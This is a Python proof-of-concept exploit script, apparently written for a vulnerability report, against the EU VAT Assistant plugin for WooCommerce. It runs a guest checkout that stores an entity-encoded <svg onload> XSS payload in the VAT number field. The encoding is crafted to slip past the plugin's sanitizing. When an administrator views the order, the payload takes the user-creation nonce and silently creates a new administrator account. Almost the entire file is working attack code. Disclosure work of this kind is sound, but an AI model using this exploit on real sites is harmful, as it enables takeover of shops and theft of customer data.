#!/usr/bin/env python3
"""
PoC: Unauthenticated Stored XSS -> Create admin user (EU VAT Assistant for WooCommerce).

Usage:
    python3 poc_admin.py --url=http://apip3.local:8851/wp/shop/
    python3 poc_admin.py --url=http://apip3.local:8851/wp/shop/ --new-user=poc --new-pass=poc

Prereqs on target (see wordfence-report-stored-xss.md):
  - Guest checkout enabled
  - EU VAT Assistant: VAT field=optional, Store invalid VAT numbers=yes,
    uncheck "Retry the validation of a VAT number..."
  - WooCommerce > Settings > Advanced > Features > Order data storage = WordPress posts storage (legacy)
  - Checkout page uses shortcode [woocommerce_checkout] (classic, not Blocks)

How it works (unauthenticated):
  1. Add product to cart via /?add-to-cart=<id>
  2. GET /checkout/ to extract woocommerce-process-checkout-nonce
  3. POST /?wc-ajax=checkout with billing + evil vat_number payload
  4. Payload is stored raw in _eu_vat_evidence and rendered unescaped at:
       wp-admin/admin.php?page=wc-orders&action=edit&id=<order_id>
       box "VAT information > Exemption details > Customer's VAT number"
     as <SVG/ONLOAD="...">. Entity-encoded JS survives
     parse_vat_number() (strtoupper + strip space/-/_/.) and decodes in browser.
  5. When an admin OPENS that order page, JS runs with admin cookies:
       GET /wp-admin/user-new.php -> parse _wpnonce_create-user
       POST /wp-admin/user-new.php -> create administrator <new-user>:<new-pass>
     Then verify: log in as <new-user>:<new-pass> or check /wp-admin/users.php
"""
import argparse
import re
import sys
from urllib.parse import urlparse

try:
    import requests
except ImportError:
    sys.exit("needs 'requests': pip install requests")


def derive_base(shop_url: str) -> str:
    u = shop_url.strip()
    if not u.startswith("http"):
        u = "http://" + u
    p = urlparse(u)
    base = f"{p.scheme}://{p.netloc}"
    path = p.path.rstrip("/")
    if path.endswith("/shop"):
        path = path[: -len("/shop")]
    return (base + path).rstrip("/")


def encode_js(js: str) -> str:
    # Survive parse_vat_number(): strtoupper + strip(' ', '-', '_', '.').
    # Decimal entities (no letters) are unaffected by strtoupper/strip
    # and are decoded by the browser inside the onload attribute.
    out = []
    for ch in js:
        if ("a" <= ch <= "z") or ch in (' ', ".", "-", "_", '"'):
            out.append(f"&#{ord(ch)};")
        else:
            out.append(ch)
    return "".join(out)


def build_payload(new_user: str, new_pass: str, new_email: str) -> str:
    # Compact JS: no unnecessary spaces. Single quotes only (outer HTML attr uses double quotes).
    # Uses user-new.php nonce flow (wpApiSettings is NOT present on the order-edit page).
    js = (
        f"fetch('/wp/wp-admin/user-new.php').then(r=>r.text()).then(t=>{{"
        f"n=t.match(/_wpnonce_create-user.+?value=\"([^\"]+)\"/)[1];"
        f"b=new URLSearchParams();"
        f"b.append('action','createuser');"
        f"b.append('_wpnonce_create-user',n);"
        f"b.append('user_login','{new_user}');"
        f"b.append('email','{new_email}');"
        f"b.append('pass1','{new_pass}');"
        f"b.append('pass2','{new_pass}');"
        f"b.append('pw_weak','1');"
        f"b.append('role','administrator');"
        f"fetch('/wp/wp-admin/user-new.php',{{method:'POST',body:b}})}})"
    )
    return f'<svg/onload="{encode_js(js)}">'


def find_product_id(s: requests.Session, base: str) -> int:
    for url in [base + "/shop/", base + "/product/poc/"]:
        try:
            r = s.get(url, timeout=15)
            m = re.search(r"add-to-cart=(\d+)", r.text)
            if m:
                return int(m.group(1))
            m = re.search(r'name="add-to-cart" value="(\d+)"', r.text)
            if m:
                return int(m.group(1))
        except Exception:
            continue
    return 13


def main():
    ap = argparse.ArgumentParser(description="Stored XSS -> create admin user via vat_number")
    ap.add_argument("--url", required=True, help="Shop URL, e.g. http://apip3.local:8851/wp/shop/")
    ap.add_argument("--country", default="FR")
    ap.add_argument("--product-id", type=int, default=None)
    ap.add_argument("--new-user", default="poc")
    ap.add_argument("--new-pass", default="poc")
    ap.add_argument("--new-email", default="poc@poc.com")
    ap.add_argument("--order-email", default="poc@localhost.com")
    args = ap.parse_args()

    # Basic sanity: new creds must not need chars stripped at runtime.
    # They travel inside single-quoted JS strings (decoded at runtime), so dots are fine.
    base = derive_base(args.url)
    print(f"[*] base: {base}")

    payload = build_payload(args.new_user, args.new_pass, args.new_email)
    print(f"[*] payload len: {len(payload)} (entity-encoded JS, survives strtoupper/strip)")

    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})

    pid = args.product_id or find_product_id(s, base)
    print(f"[*] product id: {pid}")

    r = s.get(f"{base}/?add-to-cart={pid}", timeout=15, allow_redirects=True)
    print(f"[*] add-to-cart: {r.status_code} -> {r.url}")

    r = s.get(base + "/checkout/", timeout=15)
    print(f"[*] GET /checkout/: {r.status_code} len={len(r.text)}")
    m = re.search(r'name="woocommerce-process-checkout-nonce" value="([^"]+)"', r.text)
    if not m:
        sys.exit("[-] could not find woocommerce-process-checkout-nonce. Is cart empty or checkout not classic ([woocommerce_checkout])?")
    nonce = m.group(1)
    print(f"[*] nonce: {nonce}")

    data = {
        "billing_first_name": "poc",
        "billing_last_name": "poc",
        "billing_company": "",
        "billing_country": args.country,
        "billing_address_1": "poc",
        "billing_address_2": "",
        "billing_city": "POC",
        "billing_state": "",
        "billing_postcode": "77777",
        "billing_phone": "0812345678",
        "billing_email": args.order_email,
        "vat_number": payload,
        "order_comments": "",
        "payment_method": "cod",
        "terms": "1",
        "ship_to_different_address": "0",
        "woocommerce-process-checkout-nonce": nonce,
        "security": nonce,
        "_wp_http_referer": "/checkout/",
    }
    r = s.post(base + "/?wc-ajax=checkout", data=data, timeout=30,
               headers={"Referer": base + "/checkout/", "X-Requested-With": "XMLHttpRequest"})
    print(f"[*] POST ?wc-ajax=checkout: {r.status_code}")
    try:
        j = r.json()
    except Exception:
        print(r.text[:2000])
        sys.exit("[-] non-JSON checkout response")
    print(j)

    if j.get("result") != "success":
        print("[-] checkout failed:")
        print(j.get("messages", "")[:3000])
        sys.exit(1)

    oid = j.get("order_id")
    print(f"[+] ORDER CREATED: id={oid} redirect={j.get('redirect')}")
    print(f"[+] TRIGGER (as admin, in a real browser): {base}/wp-admin/admin.php?page=wc-orders&action=edit&id={oid}")
    print("    Open it -> box 'VAT information > Exemption details > Customer's VAT number' fires onload.")
    print(f"[+] VERIFY: log in as {args.new_user}:{args.new_pass} or check {base}/wp-admin/users.php?s={args.new_user}")
    print("[!] Note: requests itself does not execute JS; the user is created only after an admin opens the order page.")


if __name__ == "__main__":
    main()
